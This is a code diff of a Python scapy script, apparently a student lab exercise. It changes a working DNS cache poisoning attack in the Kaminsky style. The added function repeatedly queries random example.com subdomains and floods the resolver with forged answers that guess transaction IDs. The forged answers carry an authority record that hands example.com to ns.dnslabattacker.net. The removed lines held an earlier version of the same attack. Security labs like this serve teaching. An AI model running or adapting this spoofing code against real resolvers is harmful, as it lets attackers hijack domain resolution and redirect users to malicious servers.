@@ -24,12 +24,11 @@ dns_port = args.dns_port
 # port that your bind uses to send its DNS queries
 my_query_port = args.query_port
 
-#./part4_starter.py --ip <bind ip> --port <NAMED port number> --query_port
-# python2 part4_starter.py --ip 127.0.0.1 --port 4702 --query_port 4701
+#python2 dnsproxy_starter.py --port <PROXY port number> --dns_port <NAMED port number>.
 #python2 dnsproxy_starter.py --port 4704 --dns_port 4702
 print(my_ip, my_port, dns_port, my_query_port)
 
-print("gereasdsadsadasd")
+# print("gereasdsadsadasd")
 
 '''
 Generates random strings of length 10.
@@ -53,44 +52,22 @@ def sendPacket(sock, packet, ip, port):
 Example code that sends a DNS query using scapy.
 '''
 def exampleSendDNSQuery():
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
-    dnsPacket = DNS(rd=1, qd=DNSQR(qname='example.com'))
-    sendPacket(sock, dnsPacket, my_ip, my_port)
-    response = sock.recv(4096)
-    response = DNS(response)
-    print "\n***** Packet Received from Remote Server *****"
-    print response.show()
-    print "***** End of Remote Server Packet *****\n"
-
-def SendDNSQuery(domain):
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
-    dnsPacket = DNS(rd=1, qd=DNSQR(qname=domain))
-    sendPacket(sock, dnsPacket, my_ip, my_port)
-
-    for i in range(100):
-        dnsPacket = DNS(id=getRandomTXID(), rd=1, qd=DNSQR(qname=domain), ns=DNSRR(rrname="example.com", ttl=86400, type="NS", rclass="IN", rdata="ns.dnslabattacker.net"))
-        print dnsPacket.show()
-        sendPacket(sock, dnsPacket, my_ip, my_port)
-
-
-    response = sock.recv(4096)
-    response = DNS(response)
-    print "\n***** Packet Received from Remote Server *****"
-    print response.show()
-    print "***** End of Remote Server Packet *****\n"
-    return response
-
+    sock_query = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
+    sock_respon = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
+    while True:
+        random_domain = getRandomSubDomain() + ".example.com"
+        query = DNS(rd=1, qd=DNSQR(qname=random_domain))
+        sendPacket(sock_query,query,my_ip,my_port)
+        for i in range(50):
+            fake_resp = DNS(id=getRandomTXID(), qr=1, aa=1, qd=DNSQR(qname=random_domain), an=DNSRR(rrname=random_domain, type='A', ttl=75000, rdata='1.1.1.1'), ns=DNSRR(rrname='example.com', type='NS', ttl=150000, rdata='ns.dnslabattacker.net'))
+            sendPacket(sock_respon, fake_resp, my_ip, my_query_port)
+        query_respon, bind = sock_query.recvfrom(4096)
+        if DNS(query_respon).ancount > 0:
+            print("successful")
+            break
+    sock_query.close()    
+    sock_respon.close()             
+    
 
 if __name__ == '__main__':
-
-
-    while True:
-        domain = getRandomSubDomain() + ".example.com"
-        response = SendDNSQuery(domain)
-        if response[DNS].ns[0].rdata == "ns.dnslabattacker.net":
-            break
-            
-
-
-
-    
+    exampleSendDNSQuery()
